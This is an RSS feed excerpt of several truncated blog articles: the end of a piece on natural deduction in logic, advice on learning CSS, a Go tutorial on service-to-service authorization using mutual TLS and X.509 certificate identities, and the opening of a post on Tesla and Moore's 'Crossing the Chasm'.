<div id="attachment_15543"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png"><img aria-describedby="caption-attachment-15543" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=228%2C231" alt="" width="228" height="231" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?w=443 443w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=295%2C300 295w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=1%2C1 1w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=45%2C45 45w" sizes="(max-width: 228px) 100vw, 228px" data-recalc-dims="1"></a></p><p id="caption-attachment-15543">Negation introduction ($\neg$I): if from $P$ we can prove $\bot$, then $\neg P$.</p></div>
<p>Finally we have <em>negation elimination</em>. This one is a nice easy way to end: it says that if we know $\neg \neg P$, then we can conclude $P$. If something isn’t not true, then it must be true!</p>
<div id="attachment_15532"><p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png"><img aria-describedby="caption-attachment-15532" loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?resize=173%2C78" alt="" width="173" height="78" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?w=372 372w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?resize=300%2C135 300w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?resize=2%2C1 2w" sizes="(max-width: 173px) 100vw, 173px" data-recalc-dims="1"></a></p><p id="caption-attachment-15532">Negation elimination ($\neg$E): if $\neg\neg P$, then $P$.</p></div>
<p>And with that, we have completed (one kind of) natural deduction, laying out a framework for proofs based on undeniable principles so that we can be <em>completely</em> confident in our results.</p>
<p>Now, you may be wondering, hey, maths is about numbers and shapes and functions and vector fields, but all we’ve been working with are $P$s and $Q$s! Not a single $n$ or $x$, let alone an $f$, has been written so far!</p>
<p>Fear not! Purely logical systems such as natural deduction are key ingredient for building typical maths. For example, to define numbers, we may first extend to <a href="https://www.quora.com/What-is-the-precise-difference-between-propositional-and-predicate-logic" target="_blank" rel="noopener noreferrer">predicate logic</a>, then construct the naturals (via the <em><a href="https://en.wikipedia.org/wiki/Peano_axioms" target="_blank" rel="noopener noreferrer">Peano axioms</a></em>), which we’ll use to make the <a href="http://www.math.hawaii.edu/~pavel/syllabi_old/aluffi_321/NZ.pdf" target="_blank" rel="noopener noreferrer">integers</a> and the <a href="https://people.clas.ufl.edu/groisser/files/rationals.pdf" target="_blank" rel="noopener noreferrer">rationals</a> (via equivalence classes), then finally the reals (via <em><a href="https://en.wikipedia.org/wiki/Dedekind_cut" target="_blank" rel="noopener noreferrer">Dedekind cuts</a></em>).</p>
<p>So, in fact, we still we get to work with all the maths we’re used to! Plus, due to the use of natural deduction, we have the added benefit of being confident about what we’re doing at every layer of abstraction!</p>
<p><strong>Predicate and propositional logic:</strong> The logic we’ve been building, with $\land$, $\lor$, $\Rightarrow$, $\neg$, and $\bot$, is known as <em>propositional</em> or <em>zeroth-order logic</em>. <em>Predicate</em> or <em>first-order logic</em> is an extension of propositional logic wherein our statements ($P$, $Q$, $X$, etc) may be parametrised. So as well as having $H$ mean that ‘I am hungry’, we may also have $\mathcal H(x)$ mean that ‘$x$ is hungry’. Additionally, predicate logic includes two <em>quantifiers</em>, $\forall$ and $\exists$, which respectively mean ‘for every’ and ‘there exists’: $\forall x \mathcal H(x)$ means that everyone is hungry, and $\exists x \mathcal H(x)$ means that (at least) one person is hungry.</p>
<h2>So what?</h2>
<p>If you’re anything like I was at age 17, or anything like how I portrayed you in the beginning of this article, you’re drooling right now. It’s like all of your fantasies regarding rigour and precision have been heard and answered by divine mathematicians.</p>
<p>But maybe you’re not intrinsically motivated by rigour, so you’re less excited by natural deduction. Which is fine! I’m not hurt. Maybe a little bit. Or maybe you just feel that this is overkill—did you <em>really</em> need all this work to know that $2 \neq 1$? Or maybe you’re not convinced that these rules are correct; perhaps you don’t agree that from $\neg \neg P$ we can conclude $P$.</p>
<p><strong>Excluding the middle:</strong> If you don’t agree, you are not alone! That $\neg \neg P$ entails $P$ is a consequence of a rule called the <em>law of excluded middle</em>, which states that $P \lor \neg P$. (This law is built-in to the system of natural deduction that we created.) Some mathematicians (<a href="https://en.wikipedia.org/wiki/Intuitionistic_logic" target="_blank" rel="noopener noreferrer">the <em>intuitionists</em> or <em>constructionists</em></a>) reject the law of excluded middle, thus also forfeiting that $\neg \neg P$ entails $P$. One reason to question the law of excluded middle is that it allows us to state that something exists without stating what it is. For instance, we are able to <a href="https://math.stackexchange.com/a/104121/243259" target="_blank" rel="noopener noreferrer">prove that an irrational number raised to the power of an irrational number can be rational</a>, but <em>without</em> giving an actual example. If we reject the law of excluded middle, then all such proofs must <em>actually construct</em> an example.</p>
<p>Still, I posit, natural deduction is worth your time. Because we’ve been so rigorous in building the system up, we gain the benefit of knowing <em>exactly what we’re talking about</em>. Before establishing such precision, we may have used $P \Rightarrow Q$, but without a sense of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/">http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/</a></em></p>]]>
            </description>
            <link>http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948031</guid>
            <pubDate>Sat, 31 Oct 2020 00:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Better at CSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24947963">thread link</a>) | @taphangum
<br/>
October 30, 2020 | https://planflow.dev/blog/how-to-get-better-at-css | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/how-to-get-better-at-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‘design’ process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don’t think it’s that important. We don’t understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you’re dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you’ve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‘design’ problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let’s go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers “their enjoyment of programming” back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‘crafting’ their applications, becoming ‘artisans’ of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‘craft’ and construct pages at a higher level of abstraction, rather than simply ‘style’ them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you’re currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‘overflow’ of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it’s with this knowledge that you may start to enjoy and view the process as ‘constructing’ pages, rather than simply ‘styling’ them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you’ve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>
            </description>
            <link>https://planflow.dev/blog/how-to-get-better-at-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947963</guid>
            <pubDate>Sat, 31 Oct 2020 00:01:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Service to Service Authorization in Go Using X.509 Certificates]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947756">thread link</a>) | @regeda
<br/>
October 30, 2020 | https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/ | <a href="https://web.archive.org/web/*/https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>Service-to-service authentication is the ability of one service to identify its clients. It’s a good idea to ensure that a service accepts requests only from specified services. But how to implement access controls (authorization)?</p>
<p>For instance, only the service <code>cart</code> is granted to bind to the service <code>invoice</code>, and only two services <code>invoice</code> and <code>billing</code> are granted to bind to the service <code>payment</code>.</p>
<p><img src="https://regeda.me/s2s_seq.svg" alt="Alt text"></p>
<p>Firstly, we must decide on the unique key of service, the attribute of a caller to be verified by a recipient. Do you think the IP address or hostname is manageable in the infrastructure at scale? It’s challenging in a multi-tenant environment where different personas can park successively the same network identity in a short period.</p>
<p>Let’s consider an <a href="https://searchsecurity.techtarget.com/definition/X509-certificate">X.509 certificate</a> which is a widely used standard for network security and identity verification.</p>
<h2 id="give-a-secure-identity-to-components">Give a secure identity to components</h2>
<p>We could go over the long way to <a href="https://www.semurity.com/how-to-setup-your-own-certificate-authority-ca-using-openssl/">set up your own Certificate Authority and sign a certificate using OpenSSL</a>. For the sake of simplicity, I use the <a href="https://github.com/cloudflare/cfssl"><strong>sfssl</strong></a> toolkit for certificates management.</p>
<h3 id="installation">Installation</h3>
<div><pre><code data-lang="shell">go get -u github.com/cloudflare/cfssl/cmd/...
</code></pre></div><h3 id="configuration">Configuration</h3>
<p>The <code>sfssl</code> toolkit expects two files to generate a certificate:</p>
<ul>
<li><code>config.json</code> – settings for the issuer</li>
<li><code>csr.json</code> – request for a certificate.</li>
</ul>
<p>The file <code>config.json</code> contains settings for the Certificate Authority. We are interested in the <code>profiles</code> section for our certificates:</p>
<div><pre><code data-lang="json">{
  <span>"signing"</span>: {
    <span>"profiles"</span>: {
      <span>"service"</span>: {
        <span>"usages"</span>: [
          <span>"signing"</span>,
          <span>"key encipherment"</span>,
          <span>"server auth"</span>,
          <span>"client auth"</span>
        ],
        <span>"expiry"</span>: <span>"720h"</span>
      }
    }
  }
}
</code></pre></div><p>The file <code>csr/ca.json</code> contains the request for the Certificate Authority certificate:</p>
<div><pre><code data-lang="json">{
  <span>"CN"</span>: <span>"Demo Citadel"</span>,
  <span>"names"</span>: [
    {
      <span>"C"</span>: <span>"US"</span>,
      <span>"L"</span>: <span>"San Francisco"</span>,
      <span>"O"</span>: <span>"Citadel, Inc."</span>,
      <span>"ST"</span>: <span>"CA"</span>
    }
  ],
  <span>"ca"</span>: {
    <span>"expiry"</span>: <span>"86700h"</span>
  }
}
</code></pre></div><p>The file <code>csr/service.json</code> contains the request for the service certificate:</p>
<div><pre><code data-lang="json">{
  <span>"CN"</span>: <span>"citadel.xyz"</span>,
  <span>"names"</span>: [
    {
      <span>"C"</span>: <span>"US"</span>,
      <span>"L"</span>: <span>"San Francisco"</span>,
      <span>"O"</span>: <span>"Citadel, Inc."</span>,
      <span>"ST"</span>: <span>"CA"</span>
    }
  ]
}
</code></pre></div><h3 id="generating">Generating</h3>
<p>The Certificate Authority certificate:</p>
<div><pre><code data-lang="shell">cfssl gencert -initca csr/ca.json | cfssljson -bare pki/ca –
</code></pre></div><p>Meantime, we reached the important step and have to define the unique attribute of service. Usually, the service has a name and it belongs to a company. Hence we need to stamp the identity <code>citadel:srv-invoice</code> into the handcrafted X.509 certificate along with the server hostname <code>host1.infra.citadel.net</code>:</p>
<div><pre><code data-lang="shell">cfssl gencert <span>\
</span><span></span>-ca pki/ca.pem -ca-key pki/ca-key.pem <span>\
</span><span></span>-config config.json <span>\
</span><span></span>-profile service <span>\
</span><span></span>-hostname <span>'host1.infra.citadel.net,citadel:srv-invoice'</span> <span>\
</span><span></span>csr/service.json | cfssljson -bare pki/srv-invoice-host1 -
</code></pre></div><p>Let’s check the resulted alternative name from the issued certificate:</p>
<div><pre><code data-lang="shell">openssl x509 -in pki/srv-invoice-host1.pem -text | grep -A <span>1</span> <span>'Alternative Name'</span>
</code></pre></div><pre><code>X509v3 Subject Alternative Name:
    DNS:host1.infra.citadel.net, URI:citadel:srv-invoice
</code></pre><p>💚 The service identity <code>citadel:srv-invoice</code> successfully assigned to the server <code>host1.infra.citadel.net</code>.</p>
<h2 id="consume-the-service-identity-in-go">Consume the service identity in Go</h2>
<p>Fortunately, the callback <code>VerifyConnection</code> of <a href="https://golang.org/pkg/crypto/tls/#Config"><code>tls.Config</code></a> was introduced in Go 1.15:</p>
<div><pre><code data-lang="go"><span>package</span> <span>tls</span>

<span>type</span> <span>Config</span> <span>struct</span> {
    <span>VerifyConnection</span> <span>func</span>(<span>ConnectionState</span>) <span>error</span>
}
</code></pre></div><p>The Go documentation says: if the function returns an error, the TLS handshake is aborted. Hence we are enabled to restrain the TLS connection permit by own.</p>
<p>For testing purposes, we make the simplest access control by a prefix:</p>
<div><pre><code data-lang="go"><span>var</span> <span>errAccessForbidden</span> = <span>errors</span>.<span>New</span>(<span>"access forbidden"</span>)

<span>func</span> <span>verifyPeerPrefix</span>(<span>prefix</span> <span>string</span>) <span>func</span>(<span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
	<span>return</span> <span>func</span>(<span>s</span> <span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
		<span>// The first element is the leaf certificate
</span><span></span>		<span>// that the connection is verified against.
</span><span></span>		<span>for</span> <span>_</span>, <span>uri</span> <span>:=</span> <span>range</span> <span>s</span>.<span>PeerCertificates</span>[<span>0</span>].<span>URIs</span> {
			<span>if</span> <span>strings</span>.<span>HasPrefix</span>(<span>uri</span>.<span>String</span>(), <span>prefix</span>) {
				<span>return</span> <span>nil</span>
			}
		}
		<span>return</span> <span>errAccessForbidden</span>
	}
}
</code></pre></div><p>Then prepare <code>tls.Config</code> for the server listener. Necessarily, the callback should be provided in conjunction with the mutual TLS authentication enabled:</p>
<div><pre><code data-lang="go"><span>cfg</span> <span>:=</span> <span>tls</span>.<span>Config</span>{
	<span>ClientAuth</span>:       <span>tls</span>.<span>RequireAndVerifyClientCert</span>,
	<span>VerifyConnection</span>: <span>verifyPeerPrefix</span>(<span>"citadel:srv"</span>),
}
</code></pre></div><blockquote>
<p>The constant <code>tls.RequireAndVerifyClientCert</code> of <a href="https://golang.org/pkg/crypto/tls/#ClientAuthType"><code>tls.ClientAuthType</code></a> indicates the server will request a client certificate and if none is provided the session will terminate, if the client certificate cannot be verified (a corresponding CA (root) certificate cannot be found) the session will also be terminated.</p>
</blockquote>
<p>The full source of the example server:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"crypto/tls"</span>
	<span>"crypto/x509"</span>
	<span>"errors"</span>
	<span>"flag"</span>
	<span>"io"</span>
	<span>"io/ioutil"</span>
	<span>"log"</span>
	<span>"net"</span>
	<span>"strings"</span>
)

<span>var</span> (
	<span>listenAddr</span>   = <span>flag</span>.<span>String</span>(<span>"listen-addr"</span>, <span>"127.0.0.1:8080"</span>, <span>"Listen address for incoming connections"</span>)
	<span>certFile</span>     = <span>flag</span>.<span>String</span>(<span>"cert"</span>, <span>""</span>, <span>"Path to a PEM-encoded certificate"</span>)
	<span>keyFile</span>      = <span>flag</span>.<span>String</span>(<span>"key"</span>, <span>""</span>, <span>"Path to a private key matching the PEM-encoded certificate"</span>)
	<span>caFile</span>       = <span>flag</span>.<span>String</span>(<span>"ca"</span>, <span>""</span>, <span>"Path to a bundle of root certificates"</span>)
	<span>acceptPrefix</span> = <span>flag</span>.<span>String</span>(<span>"accept-prefix"</span>, <span>""</span>, <span>"Accept client certificates only with this prefix"</span>)
)

<span>func</span> <span>main</span>() {
	<span>flag</span>.<span>Parse</span>()

	<span>caCert</span>, <span>err</span> <span>:=</span> <span>ioutil</span>.<span>ReadFile</span>(<span>*</span><span>caFile</span>)
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
		<span>log</span>.<span>Fatal</span>(<span>"ca cert file could not be read:"</span>, <span>err</span>)
	}
	<span>rootCAs</span> <span>:=</span> <span>x509</span>.<span>NewCertPool</span>()
	<span>if</span> !<span>rootCAs</span>.<span>AppendCertsFromPEM</span>(<span>caCert</span>) {
		<span>log</span>.<span>Fatal</span>(<span>"ca cert file could not be installed"</span>)
	}

	<span>clientCert</span>, <span>err</span> <span>:=</span> <span>tls</span>.<span>LoadX509KeyPair</span>(<span>*</span><span>certFile</span>, <span>*</span><span>keyFile</span>)
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
		<span>log</span>.<span>Fatal</span>(<span>"client cert could not be loaded:"</span>, <span>err</span>)
	}

	<span>cfg</span> <span>:=</span> <span>tls</span>.<span>Config</span>{
		<span>Certificates</span>:     []<span>tls</span>.<span>Certificate</span>{<span>clientCert</span>},
		<span>ClientCAs</span>:        <span>rootCAs</span>,
		<span>ClientAuth</span>:       <span>tls</span>.<span>RequireAndVerifyClientCert</span>,
		<span>MinVersion</span>:       <span>tls</span>.<span>VersionTLS12</span>,
		<span>VerifyConnection</span>: <span>verifyPeerPrefix</span>(<span>*</span><span>acceptPrefix</span>),
	}

	<span>l</span>, <span>err</span> <span>:=</span> <span>tls</span>.<span>Listen</span>(<span>"tcp"</span>, <span>*</span><span>listenAddr</span>, <span>&amp;</span><span>cfg</span>)
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
		<span>log</span>.<span>Fatal</span>(<span>"listen failed:"</span>, <span>err</span>)
	}

	<span>log</span>.<span>Println</span>(<span>"Listen:"</span>, <span>*</span><span>listenAddr</span>)

	<span>for</span> {
		<span>conn</span>, <span>err</span> <span>:=</span> <span>l</span>.<span>Accept</span>()
		<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
			<span>log</span>.<span>Println</span>(<span>"ERR! accept failed:"</span>, <span>err</span>)
			<span>continue</span>
		}
		<span>go</span> <span>talk</span>(<span>conn</span>)
	}
}

<span>var</span> <span>errAccessForbidden</span> = <span>errors</span>.<span>New</span>(<span>"access forbidden"</span>)

<span>func</span> <span>verifyPeerPrefix</span>(<span>prefix</span> <span>string</span>) <span>func</span>(<span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
	<span>return</span> <span>func</span>(<span>s</span> <span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
		<span>// The first element is the leaf certificate
</span><span></span>		<span>// that the connection is verified against.
</span><span></span>		<span>for</span> <span>_</span>, <span>uri</span> <span>:=</span> <span>range</span> <span>s</span>.<span>PeerCertificates</span>[<span>0</span>].<span>URIs</span> {
			<span>if</span> <span>strings</span>.<span>HasPrefix</span>(<span>uri</span>.<span>String</span>(), <span>prefix</span>) {
				<span>return</span> <span>nil</span>
			}
		}
		<span>return</span> <span>errAccessForbidden</span>
	}
}

<span>func</span> <span>talk</span>(<span>conn</span> <span>net</span>.<span>Conn</span>) {
	<span>addr</span> <span>:=</span> <span>conn</span>.<span>RemoteAddr</span>()

	<span>defer</span> <span>func</span>() {
		<span>_</span> = <span>conn</span>.<span>Close</span>()
	}()

	<span>log</span>.<span>Println</span>(<span>addr</span>, <span>"connected"</span>)
	<span>_</span>, <span>err</span> <span>:=</span> <span>io</span>.<span>Copy</span>(<span>conn</span>, <span>conn</span>) <span>// send back what we get
</span><span></span>	<span>log</span>.<span>Println</span>(<span>addr</span>, <span>"disconnected:"</span>, <span>err</span>)
}
</code></pre></div><p>Run the server to accept TLS connections from the identity <code>citadel:srv-cart</code> only:</p>
<div><pre><code data-lang="shell">go run main.go -ca pki/ca.pem <span>\
</span><span></span>-cert pki/srv-invoice-host1.pem -key pki/srv-invoice-host1-key.pem <span>\
</span><span></span>-accept-prefix citadel:srv-cart
</code></pre></div><pre><code>2020/10/27 16:58:44 Listen: 127.0.0.1:8080
</code></pre><p>✔️ The server is ready. Let’s run the client.</p>
<p>Issue the certificate for the <code>cart</code> service:</p>
<div><pre><code data-lang="shell">cfssl gencert <span>\
</span><span></span>-ca pki/ca.pem -ca-key pki/ca-key.pem <span>\
</span><span></span>-config config.json <span>\
</span><span></span>-profile service <span>\
</span><span></span>-hostname <span>'host2.infra.citadel.net,citadel:srv-cart'</span> <span>\
</span><span></span>csr/service.json | cfssljson -bare pki/srv-cart-host2 -
</code></pre></div><p>Then run the client:</p>
<div><pre><code data-lang="shell">openssl s_client <span>\
</span><span></span>-connect 127.0.0.1:8080 <span>\
</span><span></span>-cert pki/srv-cart-host2.pem <span>\
</span><span></span>-key pki/srv-cart-host2-key.pem -CAfile pki/ca.pem
</code></pre></div><pre><code>CONNECTED(00000003)
depth=1 C = US, ST = CA, L = San Francisco, O = "Citadel, Inc.", CN = Demo Citadel
verify return:1
depth=0 C = US, ST = CA, L = San Francisco, O = "Citadel, Inc.", CN = citadel.xyz
verify return:1
---
Certificate chain
 0 s:/C=US/ST=CA/L=San Francisco/O=Citadel, Inc./CN=citadel.xyz
   i:/C=US/ST=CA/L=San Francisco/O=Citadel, Inc./CN=Demo Citadel
...
    Verify return code: 0 (ok)
---
</code></pre><p>💚 The command <code>openssl</code> is hanging and waiting for the input. It means that the client granted successfully to bind the server.</p>
<p>😒 <strong>What happens if the client identity doesn’t match the server expectations?</strong></p>
<p>Restart the server with the parameter <code>-accept-prefix citadel:srv-noname</code>. Then the same client terminates with non-zero code and the output contains the error:</p>
<div><pre><code data-lang="shell">openssl s_client <span>\
</span><span></span>-connect 127.0.0.1:8080 <span>\
</span><span></span>-cert pki/srv-cart-host2.pem <span>\
</span><span></span>-key pki/srv-cart-host2-key.pem -CAfile pki/ca.pem
</code></pre></div><pre><code>...
4613156460:error:14020412:SSL routines:CONNECT_CR_SESSION_TICKET:sslv3 alert bad certificate:/AppleInternal/BuildRoot/Library/Caches/com.apple.xbs/Sources/libressl/libressl-47.140.1/libressl-2.8/ssl/ssl_p
kt.c:1200:SSL alert number 42
4613156460:error:140200E5:SSL routines:CONNECT_CR_SESSION_TICKET:ssl handshake failure:/AppleInternal/BuildRoot/Library/Caches/com.apple.xbs/Sources/libressl/libressl-47.140.1/libressl-2.8/ssl/ssl_pkt.c:5
85:
...
</code></pre><p>💚 The server <em>declines</em> the connection because the prefix <code>citadel:srv-noname</code> doesn’t match the client identity <code>citadel:srv-cart</code>:</p>
<div><pre><code data-lang="shell">go run main.go -ca pki/ca.pem <span>\
</span><span></span>-cert pki/srv-invoice-host1.pem -key pki/srv-invoice-host1-key.pem <span>\
</span><span></span>-accept-prefix citadel:srv-noname
</code></pre></div><pre><code>2020/10/27 17:22:02 Listen: 127.0.0.1:8080
2020/10/27 17:22:10 127.0.0.1:50161 connected
2020/10/27 17:22:10 127.0.0.1:50161 disconnected: access forbidden
</code></pre><h2 id="summary">Summary</h2>
<p>Hooray! We implemented service-to-service authorization based on well-known standards (X.509 certificates and the TLS protocol) with vital features out of the box:</p>
<ul>
<li><strong>Identity issuing</strong> through the standard toolkit for generating certificates.</li>
<li><strong>Identity verification</strong> by the trusted Certificate Authority</li>
<li><strong>Identity expiration and revocation</strong>  to be confident that the temporary access or a compromised certificate have never been used for years.</li>
</ul>
<p>And the approach has the undeniable advantage to be fluently integrated into the running infrastructure leveraging the TLS protocol. For instance, traffic in Service Mesh is not only secured by TLS, but it’s also hardened by access and identity management through X.509 certificates.</p>
<p>Your home task is to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/">https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/</a></em></p>]]>
            </description>
            <link>https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947756</guid>
            <pubDate>Fri, 30 Oct 2020 23:15:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla and Crossing the Chasm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947398">thread link</a>) | @mgh2
<br/>
October 30, 2020 | https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html | <a href="https://web.archive.org/web/*/https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>For many years, technology companies have been faced with the challenge of launching new products. We are all familiar with the phrases "Innovators" and "early adopters" with respect to buyers. but how, as a technology and innovation company, do you transition through the different buyer groups to reach mainstream adoption?  What is well known is that the motivation for buying changes as the customer base matures, and as a consequence the value proposition, be that the service and/or product on offer, needs to reflect the changing needs of the buyer.</p><p>Tesla aren't dealing with one transition either, it could be argued they are dealing with three:
</p><p>
These points can be appealing to some, especially Innovators and early adopters who like change, but they can equally present a problem with more conservative mainstream buyers. 
</p><div>
<h2>What is crossing the chasm? </h2>
<p>Back in around 1991 Geoffery A. Moore wrote a book called <a href="https://amzn.to/2Tjo950" title="Crossing the Chasm">Crossing the chasm</a>. This work recognises that technology as it enters the market goes through different communities of buyers, each with a different set of values and needs, and the biggest stretch is the transition from the early adopter phase to the early majority, the phase where products essentially come of age and enter the mainstream. </p>
